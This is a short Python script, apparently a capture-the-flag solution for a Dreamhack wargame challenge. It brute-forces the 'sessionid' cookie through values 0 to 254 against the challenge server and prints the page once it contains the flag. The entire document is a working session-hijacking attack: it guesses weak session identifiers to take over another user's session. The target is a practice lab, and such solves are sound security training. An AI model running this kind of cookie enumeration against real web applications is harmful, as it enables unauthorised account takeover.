import requests

url = "http://host3.dreamhack.games:13941/"
for i in range(0xFF):
    re = requests.get(url=url, cookies={"sessionid": "{}".format(str(i))})
    if "flag is" in re.text:
        print(re.text)
        break
